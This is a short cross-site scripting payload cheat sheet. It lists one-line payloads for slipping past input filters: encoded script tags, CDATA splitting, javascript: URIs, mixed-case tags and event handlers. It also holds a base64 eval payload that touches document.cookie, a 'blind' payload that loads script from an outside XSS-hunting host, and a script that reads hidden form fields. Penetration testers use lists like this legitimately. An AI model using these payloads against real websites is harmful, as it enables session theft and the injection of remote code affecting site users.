Older ASP encoding filter bypass
```%u003Cscript%u003Eprompt%u0028303%u0029%u003C/script%u003E```
Double URL encoded
```%253Cscript%253Ealert(1)%253C%252Fscript%253E```
XML Reflection XSS
```<![CDATA[<]]>script<![CDATA[>]]>alert('xss')<![CDATA[<]]>/script<![CDATA[>]]>```
Where :// is required after protocol
```javascript://%250aalert(1)```
XSS in email addresses
```"\"><s>test"@gmail.com```
  
```javascript:eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));```

<script>eval(atob('YWxlcnQoZG9jdW1lbnQuY29va2llKTs='));</script>
<imG/sRc=l oNerrOr=(prompt)() x>
"><script src=https://a007.xss.ht></script>											Blind 
<body onpageshow=alert(1)>
<style onload=alert(1)>
<marquee behavior="alternate" onstart=alert(1)>hack the planet</marquee>
<d3"<"/onclick="1>[confirm``]"<">z
&lt;script&gt;confirm(1)&lt;/script&gt;                                              HTML Encoding
“=””’></><script></script><svg onload=alert(1)>
<script>var xss = '';f=document.forms;for(i=0;i<f.length;i++){e=f[i].elements;for(n in e){if(e[n].type=='hidden'){alert(e[n].name+': '+e[n].value)}}};//'';</script>    GET Hidden Fields
<table><thead style=font-size:100px onmouseover=prompt(1)><td>XSS
<svg/x=">"/onload=confirm()//
<sCript x>(((confirm)))``</scRipt x>
